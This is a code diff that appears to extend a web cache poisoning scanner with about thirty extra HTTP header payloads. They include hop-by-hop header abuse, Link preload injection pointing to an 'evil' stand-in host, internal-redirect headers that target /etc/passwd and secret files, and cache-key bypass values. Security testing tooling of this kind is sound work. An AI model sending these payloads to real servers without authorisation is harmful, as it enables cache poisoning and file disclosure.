@@ -159,4 +159,54 @@ def get_all_signatures(payload_id: str) -> List[Dict]:
         {"name": "Transfer-Encoding", "type": "method_override", "header": "Transfer-Encoding", "value": f"chunked; poison={payload_id}"},
         {"name": "Content-Length-Mismatch", "type": "method_override", "header": "Content-Length", "value": "0"},
         {"name": "X-HTTP-Method", "type": "method_override", "header": "X-HTTP-Method", "value": f"POST; poison={payload_id}"},
+        
+        # --- Exotic / Out-of-the-Box Signatures ---
+        # Time-based manipulation
+        {"name": "Date-Backdating", "type": "exotic", "header": "Date", "value": "Mon, 01 Jan 2020 00:00:00 GMT"},
+        {"name": "Date-Future", "type": "exotic", "header": "Date", "value": "Wed, 01 Jan 2099 00:00:00 GMT"},
+        {"name": "If-Modified-Since-Future", "type": "exotic", "header": "If-Modified-Since", "value": "Wed, 01 Jan 2099 00:00:00 GMT"},
+        {"name": "If-Modified-Since-Epoch", "type": "exotic", "header": "If-Modified-Since", "value": "Thu, 01 Jan 1970 00:00:00 GMT"},
+        {"name": "If-None-Match-Fake", "type": "exotic", "header": "If-None-Match", "value": f'"{payload_id}"'},
+        {"name": "If-None-Match-Wildcard", "type": "exotic", "header": "If-None-Match", "value": "*"},
+        
+        # Hop-by-hop exploitation
+        {"name": "Connection-XFH", "type": "exotic", "header": "Connection", "value": "close, X-Forwarded-Host"},
+        {"name": "Connection-XFF", "type": "exotic", "header": "Connection", "value": "close, X-Forwarded-For"},
+        {"name": "Connection-Cookie", "type": "exotic", "header": "Connection", "value": "close, Cookie"},
+        {"name": "Connection-XOrigURL", "type": "exotic", "header": "Connection", "value": "close, X-Original-URL"},
+        
+        # Early hints / Link header injection
+        {"name": "Link-Preload-Script", "type": "exotic", "header": "Link", "value": f"</evil-{payload_id}.js>; rel=preload; as=script"},
+        {"name": "Link-Preload-Style", "type": "exotic", "header": "Link", "value": f"</evil-{payload_id}.css>; rel=preload; as=style"},
+        {"name": "Link-DNS-Prefetch", "type": "exotic", "header": "Link", "value": f"<https://evil-{payload_id}.com>; rel=dns-prefetch"},
+        
+        # Accept header edge cases
+        {"name": "Accept-Q-Edge", "type": "exotic", "header": "Accept", "value": "text/*;q=0.001, */*;q=0"},
+        {"name": "Accept-Invalid-MIME", "type": "exotic", "header": "Accept", "value": f"text/html-{payload_id}"},
+        {"name": "Accept-Wildcard-Payload", "type": "exotic", "header": "Accept", "value": f"*/*; {payload_id}"},
+        {"name": "Accept-JSON-Override", "type": "exotic", "header": "Accept", "value": "application/json"},
+        
+        # Age/Warning manipulation
+        {"name": "Age-Zero", "type": "exotic", "header": "Age", "value": "0"},
+        {"name": "Age-Max", "type": "exotic", "header": "Age", "value": "2147483647"},
+        {"name": "Warning-Stale", "type": "exotic", "header": "Warning", "value": f'110 - "Response is stale {payload_id}"'},
+        
+        # Internal redirect headers (nginx/apache)
+        {"name": "X-Accel-Redirect", "type": "exotic", "header": "X-Accel-Redirect", "value": f"/internal/secret?p={payload_id}"},
+        {"name": "X-Sendfile", "type": "exotic", "header": "X-Sendfile", "value": f"/app/secret-{payload_id}.txt"},
+        {"name": "X-Lighttpd-Send-File", "type": "exotic", "header": "X-Lighttpd-Send-File", "value": f"/etc/passwd"},
+        
+        # Content negotiation confusion
+        {"name": "Content-Type-HTML", "type": "exotic", "header": "Content-Type", "value": "text/html"},
+        {"name": "Content-Encoding-Identity", "type": "exotic", "header": "Content-Encoding", "value": "identity"},
+        {"name": "Accept-Encoding-Poison", "type": "exotic", "header": "Accept-Encoding", "value": f"gzip, deflate, {payload_id}"},
+        
+        # HTTP/1.0 downgrade
+        {"name": "HTTP10-Connection", "type": "exotic", "header": "Connection", "value": "close"},
+        {"name": "HTTP10-Version", "type": "exotic", "header": "X-HTTP-Version", "value": "1.0"},
+        
+        # Cache key bypass attempts
+        {"name": "X-Cache-Key-Bypass", "type": "exotic", "header": "X-Cache-Key", "value": "bypass-true"},
+        {"name": "X-Cache-Hash", "type": "exotic", "header": "X-Cache-Hash", "value": f"{payload_id}"},
+        {"name": "Cache-Control-Override", "type": "exotic", "header": "Cache-Control", "value": "no-transform, public"},
     ]
